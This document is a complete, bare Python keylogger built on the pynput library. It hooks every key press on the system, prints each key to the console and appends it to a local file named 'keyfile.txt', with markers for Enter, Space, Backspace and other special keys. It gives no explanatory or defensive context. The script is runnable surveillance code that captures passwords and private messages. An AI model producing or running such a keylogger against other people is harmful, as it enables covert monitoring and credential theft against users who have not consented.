from pynput import keyboard

def keyPressed(key):
    try:
        char = key.char
        if char is not None:
            print(char, end='', flush=True)
            with open("keyfile.txt", 'a') as logkey:
                logkey.write(char)
        else:
            raise AttributeError
    except AttributeError:
        with open("keyfile.txt", 'a') as logkey:
            if key == keyboard.Key.enter:
                print('\n', end='', flush=True)
                logkey.write('\n')
            elif key == keyboard.Key.space:
                print(' ', end='', flush=True)
                logkey.write(' ')
            elif key == keyboard.Key.backspace:
                print('[BACKSPACE]', end='', flush=True)
                logkey.write('[BACKSPACE]')
            else:
                print(f'[{key}]', end='', flush=True)
                logkey.write(f'[{key}]')

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
